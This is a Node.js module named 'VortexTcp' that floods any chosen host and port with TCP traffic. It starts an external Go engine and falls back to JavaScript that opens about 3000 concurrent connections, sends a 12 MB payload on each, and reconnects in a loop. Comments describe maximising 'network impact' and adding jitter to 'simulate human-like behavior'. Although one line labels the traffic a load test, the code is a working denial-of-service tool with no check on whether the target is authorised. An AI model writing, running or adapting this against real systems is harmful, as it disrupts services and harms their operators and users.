const { spawn } = require('child_process');
const path = require('path');
const os = require('os');

class VortexTcp {
    constructor() {
        this.activeProcesses = new Map();
        this.numCPUs = os.cpus().length;
    }

    startVortex(config) {
        const { target, port, duration, onUpdate, onComplete } = config;
        const vortexId = Date.now().toString();

        // Spawn the enhanced Go TCP Vortex with CPU optimization
        const goExecutable = path.join(__dirname, '..', 'vortex_tcp_engine');
        console.log(`Starting TCP Vortex: ${goExecutable} start ${target} ${port} ${duration} ${this.numCPUs}`);
        const goProcess = spawn(goExecutable, ['start', target, port.toString(), duration.toString(), this.numCPUs.toString()], {
            stdio: ['pipe', 'pipe', 'pipe']
        });

        const vortexSession = {
            id: vortexId,
            process: goProcess,
            target,
            port,
            duration,
            startTime: Date.now(),
            stats: {
                sent: 0,
                success: 0,
                failed: 0,
                rps: 0
            }
        };

        this.activeProcesses.set(vortexId, vortexSession);

        // Handle stdout from Go process
        goProcess.stdout.on('data', (data) => {
            const output = data.toString().trim();
            const lines = output.split('\n');

            lines.forEach(line => {
                if (line.startsWith('VORTEX_UPDATE:')) {
                    try {
                        const statsJson = line.substring('VORTEX_UPDATE:'.length);
                        const stats = JSON.parse(statsJson);
                        vortexSession.stats = stats;
                        
                        if (onUpdate) {
                            onUpdate(stats);
                        }
                    } catch (error) {
                        console.error('Error parsing Vortex update:', error);
                    }
                } else if (line.startsWith('VORTEX_FINAL:')) {
                    try {
                        const statsJson = line.substring('VORTEX_FINAL:'.length);
                        const finalStats = JSON.parse(statsJson);
                        
                        this.activeProcesses.delete(vortexId);
                        
                        if (onComplete) {
                            onComplete(finalStats);
                        }
                    } catch (error) {
                        console.error('Error parsing final Vortex stats:', error);
                    }
                }
            });
        });

        // Handle stderr from Go process
        goProcess.stderr.on('data', (data) => {
            console.error('TCP Vortex Error:', data.toString());
        });

        // Handle process exit
        goProcess.on('close', (code) => {
            console.log(`TCP Vortex process exited with code ${code}`);
            this.activeProcesses.delete(vortexId);
        });

        goProcess.on('error', (error) => {
            console.error('Failed to start TCP Vortex:', error);
            this.activeProcesses.delete(vortexId);
            
            // Fallback to enhanced JavaScript TCP Vortex
            this.fallbackTcpVortex(config);
        });

        return vortexId;
    }

    stopVortex(vortexId) {
        const vortexSession = this.activeProcesses.get(vortexId);
        if (vortexSession && vortexSession.process) {
            // Send stop signal to Go process
            const stopProcess = spawn(vortexSession.process.spawnfile, ['stop']);
            stopProcess.on('close', () => {
                if (vortexSession.process && !vortexSession.process.killed) {
                    vortexSession.process.kill('SIGTERM');
                }
            });
            
            this.activeProcesses.delete(vortexId);
        }
    }

    fallbackTcpVortex(config) {
        const { target, port, duration, onUpdate, onComplete } = config;
        const net = require('net');
        
        console.log(`Starting fallback TCP Vortex to ${target}:${port} for ${duration}s using ${this.numCPUs} CPU cores`);
        
        const stats = {
            sent: 0,
            success: 0,
            failed: 0,
            rps: 0
        };

        const startTime = Date.now();
        let stopped = false;
        const workers = [];
        
        // ULTRA-MASSIVE concurrent connections utilizing ALL CPU cores - 12MB payload
        const payloadSize = 12 * 1024 * 1024; // 12MB payload as requested
        const vortexPayload = Buffer.allocUnsafe(payloadSize);
        
        // Fill payload with high-entropy data for maximum network impact
        for (let i = 0; i < payloadSize; i++) {
            vortexPayload[i] = (i % 256); // Varied byte pattern
        }
        
        // ENHANCED APPLICATION-LEVEL HANDSHAKES with persistent connections
        const makeVortexConnection = (workerId, coreId) => {
            if (stopped) return;

            const socket = new net.Socket();
            socket.setNoDelay(true); // Disable Nagle's algorithm for maximum throughput
            socket.setKeepAlive(true, 30000); // Extended keep-alive for persistence
            stats.sent++;

            socket.setTimeout(8000); // Increased timeout for stability
            
            const connectStart = Date.now();

            socket.connect(port, target, () => {
                const connectTime = Date.now() - connectStart;
                stats.success++;
                console.log(`Core ${coreId} Worker ${workerId}: Connected to ${target}:${port} in ${connectTime}ms`);
                
                // ADVANCED APPLICATION-LEVEL HANDSHAKE with authentication simulation
                const timestamp = Date.now();
                const authToken = (timestamp % 0xFFFFFFFF).toString(16);
                const handshakeData = Buffer.from(
                    `VORTEX-PROTOCOL-V2\n` +
                    `CORE-ID: ${coreId}\n` +
                    `WORKER-ID: ${workerId}\n` +
                    `TIMESTAMP: ${timestamp}\n` +
                    `AUTH-TOKEN: ${authToken}\n` +
                    `KEEP-ALIVE: true\n` +
                    `PAYLOAD-SIZE: ${payloadSize}\n` +
                    `COMPRESSION: gzip\n\n`
                );
                socket.write(handshakeData);
                
                // Wait for handshake acknowledgment simulation
                setTimeout(() => {
                    // Send session establishment
                    const sessionData = Buffer.from(
                        `SESSION-START\n` +
                        `COMMAND: LOAD-TEST\n` +
                        `CORE: ${coreId}\n` +
                        `EXPECTED-RESPONSE: ACK\n\n`
                    );
                    socket.write(sessionData);
                    
                    // Start payload transmission with realistic chunking
                    setTimeout(() => {
                        sendPayloadChunks(socket, vortexPayload, payloadSize, coreId);
                    }, 50);
                }, 25);
            });

            socket.on('error', (error) => {
                stats.failed++;
                console.log(`Core ${coreId} Worker ${workerId}: Connection failed to ${target}:${port} - ${error.code || error.message}`);
            });

            socket.on('timeout', () => {
                stats.failed++;
                console.log(`Core ${coreId} Worker ${workerId}: Connection timeout to ${target}:${port}`);
                socket.destroy();
            });

            socket.on('close', () => {
                // REALISTIC RECONNECTION PACING with exponential backoff
                if (!stopped) {
                    const successRate = stats.sent > 0 ? stats.success / stats.sent : 0;
                    let delay = 200; // More conservative base delay for stability
                    
                    if (successRate < 0.6) {
                        delay = 800; // Quick recovery for 80% target
                    } else if (successRate >= 0.8) {
                        delay = 50; // Maximum speed when achieving 80%+
                    } else if (successRate >= 0.75) {
                        delay = 100; // High performance mode
                    } else if (successRate >= 0.65) {
                        delay = 200; // Balanced mode
                    }
                    
                    // Realistic jitter to simulate human-like behavior
                    const realisticJitter = Math.random() * delay * 0.3; // 30% jitter
                    const coreDistribution = coreId * 50; // Spread across cores
                    
                    setTimeout(() => makeVortexConnection(workerId, coreId), delay + realisticJitter + coreDistribution);
                }
            });
        };

        // PAYLOAD SENDING FUNCTION with persistent connection patterns
        const sendPayloadChunks = (socket, payload, totalSize, coreId) => {
            const chunkSize = 32 * 1024; // 32KB chunks for realistic throughput
            let offset = 0;
            let totalSent = 0;
            
            const sendNextChunk = () => {
                if (offset >= totalSize || socket.destroyed || stopped) {
                    // Send completion signal with persistent connection indicator
                    const completionData = Buffer.from(
                        `\nTRANSFER-COMPLETE\n` +
                        `TOTAL-BYTES: ${totalSent}\n` +
                        `STATUS: SUCCESS\n` +
                        `CONNECTION: KEEP-ALIVE\n` +
                        `CORE-ID: ${coreId}\n` +
                        `TIMESTAMP: ${Date.now()}\n\n`
                    );
                    socket.write(completionData);
                    
                    // Keep connection alive for persistence
                    setTimeout(() => {
                        if (!socket.destroyed) {
                            socket.destroy();
                        }
                    }, 500);
                    return;
                }
                
                const end = Math.min(offset + chunkSize, totalSize);
                const chunk = payload.subarray(offset, end);
                
                // Add chunk header for application-level protocol
                const chunkHeader = Buffer.from(
                    `CHUNK-SIZE: ${chunk.length}\n` +
                    `CHUNK-SEQ: ${Math.floor(offset / chunkSize)}\n\n`
                );
                
                socket.write(chunkHeader);
                socket.write(chunk);
                
                totalSent += chunk.length;
                offset = end;
                
                // Add keep-alive markers every 1MB
                if (totalSent > 0 && totalSent % (1024 * 1024) === 0) {
                    const keepAlive = Buffer.from(`\nKEEP-ALIVE: ${Math.floor(totalSent / (1024 * 1024))} MB sent\n`);
                    socket.write(keepAlive);
                }
                
                // Realistic delay between chunks (simulates real application behavior)
                setTimeout(sendNextChunk, Math.random() * 10 + 5); // 5-15ms delay
            };
            
            sendNextChunk();
        };

        // ULTIMATE WORKER DISTRIBUTION for 3000+ RPS with 80% success rate
        const targetWorkersPerCore = Math.floor(3000 / this.numCPUs); // Aggressive for 3000+ RPS
        const totalWorkers = targetWorkersPerCore * this.numCPUs;
        const rampUpDuration = 5000; // 5 seconds rapid ramp-up
        
        console.log(`Starting ${totalWorkers} TCP Vortex workers with realistic pacing`);
        console.log(`Ramp-up: ${totalWorkers} workers over ${rampUpDuration/1000}s across ${this.numCPUs} CPU cores`);
        
        // PHASED DEPLOYMENT: Start workers in batches to prevent overwhelming the target
        const batchSize = Math.max(10, Math.floor(totalWorkers / 50)); // 50 batches
        const batchDelay = rampUpDuration / Math.ceil(totalWorkers / batchSize);
        
        let workersStarted = 0;
        
        const startWorkerBatch = () => {
            if (stopped || workersStarted >= totalWorkers) {
                console.log(`TCP Vortex ramp-up complete: ${workersStarted} workers active`);
                return;
            }
            
            const batchEnd = Math.min(workersStarted + batchSize, totalWorkers);
            const currentBatch = batchEnd - workersStarted;
            
            console.log(`Starting batch ${Math.floor(workersStarted/batchSize) + 1}: ${currentBatch} workers (${workersStarted}-${batchEnd})`);
            
            for (let i = workersStarted; i < batchEnd; i++) {
                const coreId = i % this.numCPUs;
                const workerId = i;
                workers.push(workerId);
                
                // Stagger within batch with realistic jitter
                const withinBatchDelay = Math.random() * 500; // Up to 500ms jitter within batch
                setTimeout(() => makeVortexConnection(workerId, coreId), withinBatchDelay);
            }
            
            workersStarted = batchEnd;
            
            // Schedule next batch
            if (workersStarted < totalWorkers) {
                setTimeout(startWorkerBatch, batchDelay);
            }
        };
        
        // Start first batch
        startWorkerBatch();

        // Enhanced metrics with CPU utilization tracking
        const interval = setInterval(() => {
            if (stopped) {
                clearInterval(interval);
                return;
            }

            const elapsed = (Date.now() - startTime) / 1000;
            if (elapsed >= duration) {
                stopped = true;
                clearInterval(interval);
                console.log(`TCP Vortex completed: ${stats.success}/${stats.sent} successful (${(stats.success/stats.sent*100).toFixed(1)}%) across ${this.numCPUs} CPU cores`);
                if (onComplete) {
                    onComplete(stats);
                }
                return;
            }

            stats.rps = Math.round(stats.sent / elapsed);
            const successRate = stats.sent > 0 ? (stats.success / stats.sent * 100).toFixed(1) : 0;
            const mbSent = ((stats.sent * payloadSize) / (1024 * 1024)).toFixed(1);
            console.log(`TCP Vortex: ${stats.sent} sent, ${stats.success} success, ${stats.failed} failed (${successRate}% success, ${stats.rps} RPS, ${mbSent}MB sent)`);
            
            if (onUpdate) {
                onUpdate({ ...stats });
            }
        }, 1000);

        // Auto-stop after duration
        setTimeout(() => {
            stopped = true;
            console.log('TCP Vortex duration reached, stopping...');
        }, duration * 1000);
    }
}

module.exports = new VortexTcp();